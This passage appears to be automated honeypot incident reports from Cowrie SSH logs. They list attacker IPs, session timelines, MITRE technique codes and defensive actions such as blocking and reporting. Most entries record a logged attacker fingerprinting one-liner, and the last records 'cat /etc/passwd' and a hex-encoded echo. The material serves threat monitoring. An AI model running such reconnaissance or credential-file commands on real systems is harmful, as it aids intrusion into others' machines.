| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:36:15` | `cowrie.session.connect` |
| `2026-07-28 22:36:15` | `cowrie.client.version` |
| `2026-07-28 22:36:15` | `cowrie.client.kex` |
| `2026-07-28 22:36:16` | `cowrie.login.success` |
| `2026-07-28 22:36:18` | `cowrie.session.params` |
| `2026-07-28 22:36:18` | `cowrie.command.input` |
| `2026-07-28 22:36:18` | `cowrie.command.input` |
| `2026-07-28 22:36:18` | `cowrie.command.input` |
| `2026-07-28 22:36:18` | `cowrie.command.input` |
| `2026-07-28 22:36:18` | `cowrie.command.input` |
| `2026-07-28 22:36:18` | `cowrie.command.success` |
| `2026-07-28 22:36:18` | `cowrie.command.input` |
| `2026-07-28 22:36:18` | `cowrie.command.input` |
| `2026-07-28 22:36:18` | `cowrie.command.input` |
| `2026-07-28 22:36:18` | `cowrie.command.input` |
| `2026-07-28 22:36:18` | `cowrie.log.closed` |
| `2026-07-28 22:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd47a68aa028

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:37 |
| **Last Seen** | 2026-07-28 22:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:37:39` | `cowrie.session.connect` |
| `2026-07-28 22:37:40` | `cowrie.client.version` |
| `2026-07-28 22:37:40` | `cowrie.client.kex` |
| `2026-07-28 22:37:41` | `cowrie.login.success` |
| `2026-07-28 22:37:42` | `cowrie.session.params` |
| `2026-07-28 22:37:42` | `cowrie.command.input` |
| `2026-07-28 22:37:42` | `cowrie.command.input` |
| `2026-07-28 22:37:42` | `cowrie.command.input` |
| `2026-07-28 22:37:42` | `cowrie.command.input` |
| `2026-07-28 22:37:42` | `cowrie.command.input` |
| `2026-07-28 22:37:42` | `cowrie.command.success` |
| `2026-07-28 22:37:42` | `cowrie.command.input` |
| `2026-07-28 22:37:42` | `cowrie.command.input` |
| `2026-07-28 22:37:42` | `cowrie.command.input` |
| `2026-07-28 22:37:42` | `cowrie.command.input` |
| `2026-07-28 22:37:43` | `cowrie.log.closed` |
| `2026-07-28 22:37:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0bcbd6187db

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:39 |
| **Last Seen** | 2026-07-28 22:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:39:01` | `cowrie.session.connect` |
| `2026-07-28 22:39:01` | `cowrie.client.version` |
| `2026-07-28 22:39:01` | `cowrie.client.kex` |
| `2026-07-28 22:39:03` | `cowrie.login.success` |
| `2026-07-28 22:39:04` | `cowrie.session.params` |
| `2026-07-28 22:39:04` | `cowrie.command.input` |
| `2026-07-28 22:39:04` | `cowrie.command.input` |
| `2026-07-28 22:39:04` | `cowrie.command.input` |
| `2026-07-28 22:39:04` | `cowrie.command.input` |
| `2026-07-28 22:39:04` | `cowrie.command.input` |
| `2026-07-28 22:39:04` | `cowrie.command.success` |
| `2026-07-28 22:39:04` | `cowrie.command.input` |
| `2026-07-28 22:39:04` | `cowrie.command.input` |
| `2026-07-28 22:39:04` | `cowrie.command.input` |
| `2026-07-28 22:39:04` | `cowrie.command.input` |
| `2026-07-28 22:39:04` | `cowrie.log.closed` |
| `2026-07-28 22:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92eca2f40fcf

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:40 |
| **Last Seen** | 2026-07-28 22:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:40:23` | `cowrie.session.connect` |
| `2026-07-28 22:40:24` | `cowrie.client.version` |
| `2026-07-28 22:40:24` | `cowrie.client.kex` |
| `2026-07-28 22:40:25` | `cowrie.login.success` |
| `2026-07-28 22:40:26` | `cowrie.session.params` |
| `2026-07-28 22:40:26` | `cowrie.command.input` |
| `2026-07-28 22:40:26` | `cowrie.command.input` |
| `2026-07-28 22:40:26` | `cowrie.command.input` |
| `2026-07-28 22:40:26` | `cowrie.command.input` |
| `2026-07-28 22:40:26` | `cowrie.command.input` |
| `2026-07-28 22:40:26` | `cowrie.command.success` |
| `2026-07-28 22:40:26` | `cowrie.command.input` |
| `2026-07-28 22:40:26` | `cowrie.command.input` |
| `2026-07-28 22:40:26` | `cowrie.command.input` |
| `2026-07-28 22:40:26` | `cowrie.command.input` |
| `2026-07-28 22:40:27` | `cowrie.log.closed` |
| `2026-07-28 22:40:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86986a41cce3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:41 |
| **Last Seen** | 2026-07-28 22:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:41:45` | `cowrie.session.connect` |
| `2026-07-28 22:41:45` | `cowrie.client.version` |
| `2026-07-28 22:41:45` | `cowrie.client.kex` |
| `2026-07-28 22:41:47` | `cowrie.login.success` |
| `2026-07-28 22:41:49` | `cowrie.session.params` |
| `2026-07-28 22:41:49` | `cowrie.command.input` |
| `2026-07-28 22:41:49` | `cowrie.command.input` |
| `2026-07-28 22:41:49` | `cowrie.command.input` |
| `2026-07-28 22:41:49` | `cowrie.command.input` |
| `2026-07-28 22:41:49` | `cowrie.command.input` |
| `2026-07-28 22:41:49` | `cowrie.command.success` |
| `2026-07-28 22:41:49` | `cowrie.command.input` |
| `2026-07-28 22:41:49` | `cowrie.command.input` |
| `2026-07-28 22:41:49` | `cowrie.command.input` |
| `2026-07-28 22:41:49` | `cowrie.command.input` |
| `2026-07-28 22:41:49` | `cowrie.log.closed` |
| `2026-07-28 22:41:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb15db754c36

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:43 |
| **Last Seen** | 2026-07-28 22:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:43:04` | `cowrie.session.connect` |
| `2026-07-28 22:43:04` | `cowrie.client.version` |
| `2026-07-28 22:43:04` | `cowrie.client.kex` |
| `2026-07-28 22:43:06` | `cowrie.login.success` |
| `2026-07-28 22:43:08` | `cowrie.session.params` |
| `2026-07-28 22:43:08` | `cowrie.command.input` |
| `2026-07-28 22:43:08` | `cowrie.command.input` |
| `2026-07-28 22:43:08` | `cowrie.command.input` |
| `2026-07-28 22:43:08` | `cowrie.command.input` |
| `2026-07-28 22:43:08` | `cowrie.command.input` |
| `2026-07-28 22:43:08` | `cowrie.command.success` |
| `2026-07-28 22:43:08` | `cowrie.command.input` |
| `2026-07-28 22:43:08` | `cowrie.command.input` |
| `2026-07-28 22:43:08` | `cowrie.command.input` |
| `2026-07-28 22:43:08` | `cowrie.command.input` |
| `2026-07-28 22:43:08` | `cowrie.log.closed` |
| `2026-07-28 22:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60da6ec57ec8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:44 |
| **Last Seen** | 2026-07-28 22:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:44:22` | `cowrie.session.connect` |
| `2026-07-28 22:44:22` | `cowrie.client.version` |
| `2026-07-28 22:44:22` | `cowrie.client.kex` |
| `2026-07-28 22:44:24` | `cowrie.login.success` |
| `2026-07-28 22:44:25` | `cowrie.session.params` |
| `2026-07-28 22:44:25` | `cowrie.command.input` |
| `2026-07-28 22:44:25` | `cowrie.command.input` |
| `2026-07-28 22:44:25` | `cowrie.command.input` |
| `2026-07-28 22:44:25` | `cowrie.command.input` |
| `2026-07-28 22:44:25` | `cowrie.command.input` |
| `2026-07-28 22:44:25` | `cowrie.command.success` |
| `2026-07-28 22:44:25` | `cowrie.command.input` |
| `2026-07-28 22:44:25` | `cowrie.command.input` |
| `2026-07-28 22:44:25` | `cowrie.command.input` |
| `2026-07-28 22:44:25` | `cowrie.command.input` |
| `2026-07-28 22:44:26` | `cowrie.log.closed` |
| `2026-07-28 22:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae152491e2b8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:45 |
| **Last Seen** | 2026-07-28 22:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:45:39` | `cowrie.session.connect` |
| `2026-07-28 22:45:39` | `cowrie.client.version` |
| `2026-07-28 22:45:39` | `cowrie.client.kex` |
| `2026-07-28 22:45:41` | `cowrie.login.success` |
| `2026-07-28 22:45:42` | `cowrie.session.params` |
| `2026-07-28 22:45:42` | `cowrie.command.input` |
| `2026-07-28 22:45:42` | `cowrie.command.input` |
| `2026-07-28 22:45:42` | `cowrie.command.input` |
| `2026-07-28 22:45:42` | `cowrie.command.input` |
| `2026-07-28 22:45:42` | `cowrie.command.input` |
| `2026-07-28 22:45:42` | `cowrie.command.success` |
| `2026-07-28 22:45:42` | `cowrie.command.input` |
| `2026-07-28 22:45:42` | `cowrie.command.input` |
| `2026-07-28 22:45:42` | `cowrie.command.input` |
| `2026-07-28 22:45:42` | `cowrie.command.input` |
| `2026-07-28 22:45:42` | `cowrie.log.closed` |
| `2026-07-28 22:45:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed972484722c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:46 |
| **Last Seen** | 2026-07-28 22:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:46:57` | `cowrie.session.connect` |
| `2026-07-28 22:46:57` | `cowrie.client.version` |
| `2026-07-28 22:46:57` | `cowrie.client.kex` |
| `2026-07-28 22:46:59` | `cowrie.login.success` |
| `2026-07-28 22:47:00` | `cowrie.session.params` |
| `2026-07-28 22:47:00` | `cowrie.command.input` |
| `2026-07-28 22:47:00` | `cowrie.command.input` |
| `2026-07-28 22:47:00` | `cowrie.command.input` |
| `2026-07-28 22:47:00` | `cowrie.command.input` |
| `2026-07-28 22:47:00` | `cowrie.command.input` |
| `2026-07-28 22:47:00` | `cowrie.command.success` |
| `2026-07-28 22:47:00` | `cowrie.command.input` |
| `2026-07-28 22:47:00` | `cowrie.command.input` |
| `2026-07-28 22:47:00` | `cowrie.command.input` |
| `2026-07-28 22:47:00` | `cowrie.command.input` |
| `2026-07-28 22:47:00` | `cowrie.log.closed` |
| `2026-07-28 22:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea7e0dd5ecfb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:48 |
| **Last Seen** | 2026-07-28 22:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:48:18` | `cowrie.session.connect` |
| `2026-07-28 22:48:18` | `cowrie.client.version` |
| `2026-07-28 22:48:18` | `cowrie.client.kex` |
| `2026-07-28 22:48:20` | `cowrie.login.success` |
| `2026-07-28 22:48:21` | `cowrie.session.params` |
| `2026-07-28 22:48:21` | `cowrie.command.input` |
| `2026-07-28 22:48:21` | `cowrie.command.input` |
| `2026-07-28 22:48:21` | `cowrie.command.input` |
| `2026-07-28 22:48:21` | `cowrie.command.input` |
| `2026-07-28 22:48:21` | `cowrie.command.input` |
| `2026-07-28 22:48:21` | `cowrie.command.success` |
| `2026-07-28 22:48:21` | `cowrie.command.input` |
| `2026-07-28 22:48:21` | `cowrie.command.input` |
| `2026-07-28 22:48:21` | `cowrie.command.input` |
| `2026-07-28 22:48:21` | `cowrie.command.input` |
| `2026-07-28 22:48:22` | `cowrie.log.closed` |
| `2026-07-28 22:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d5282550dfd

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:49 |
| **Last Seen** | 2026-07-28 22:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:49:41` | `cowrie.session.connect` |
| `2026-07-28 22:49:42` | `cowrie.client.version` |
| `2026-07-28 22:49:42` | `cowrie.client.kex` |
| `2026-07-28 22:49:43` | `cowrie.login.success` |
| `2026-07-28 22:49:44` | `cowrie.session.params` |
| `2026-07-28 22:49:44` | `cowrie.command.input` |
| `2026-07-28 22:49:44` | `cowrie.command.input` |
| `2026-07-28 22:49:44` | `cowrie.command.input` |
| `2026-07-28 22:49:44` | `cowrie.command.input` |
| `2026-07-28 22:49:44` | `cowrie.command.input` |
| `2026-07-28 22:49:44` | `cowrie.command.success` |
| `2026-07-28 22:49:44` | `cowrie.command.input` |
| `2026-07-28 22:49:44` | `cowrie.command.input` |
| `2026-07-28 22:49:44` | `cowrie.command.input` |
| `2026-07-28 22:49:44` | `cowrie.command.input` |
| `2026-07-28 22:49:45` | `cowrie.log.closed` |
| `2026-07-28 22:49:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083526a4a36c

| Field | Detail |
|---|---|
| **Source IP** | `111.70.29[.]158` |
| **First Seen** | 2026-07-28 22:49 |
| **Last Seen** | 2026-07-28 22:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:49:44` | `cowrie.session.connect` |
| `2026-07-28 22:49:45` | `cowrie.client.version` |
| `2026-07-28 22:49:45` | `cowrie.client.kex` |
| `2026-07-28 22:49:47` | `cowrie.login.success` |
| `2026-07-28 22:49:47` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.29[.]158` to AbuseIPDB if not already reported
- [ ] Block `111.70.29[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4402d4d4cbc5

| Field | Detail |
|---|---|
| **Source IP** | `211.169.212[.]206` |
| **First Seen** | 2026-07-28 22:49 |
| **Last Seen** | 2026-07-28 22:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:49:53` | `cowrie.session.connect` |
| `2026-07-28 22:49:53` | `cowrie.client.version` |
| `2026-07-28 22:49:53` | `cowrie.client.kex` |
| `2026-07-28 22:49:55` | `cowrie.login.success` |
| `2026-07-28 22:49:56` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:50:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.169.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `211.169.212[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9313946345d5

| Field | Detail |
|---|---|
| **Source IP** | `27.72.98[.]85` |
| **First Seen** | 2026-07-28 22:50 |
| **Last Seen** | 2026-07-28 22:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:50:49` | `cowrie.session.connect` |
